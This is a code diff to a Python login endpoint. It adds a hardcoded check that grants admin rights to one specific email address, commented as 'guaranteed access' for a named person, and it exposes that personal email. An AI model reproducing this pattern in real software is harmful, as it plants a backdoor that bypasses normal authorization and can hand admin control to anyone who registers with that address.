@@ -74,6 +74,11 @@ def login(data: UserLogin, db: Session = Depends(get_db)):
         raise HTTPException(status_code=403, detail="Аккаунт бұғатталған")
 
     token = create_access_token({"sub": str(user.id)})
+    
+    # Hardcoded admin for Syrym (guaranteed access)
+    if user.email.lower() == "syrymkyrkynbay05@gmail.com":
+        user.is_admin = True
+        
     return TokenResponse(access_token=token, user=UserProfile.model_validate(user))
 
 
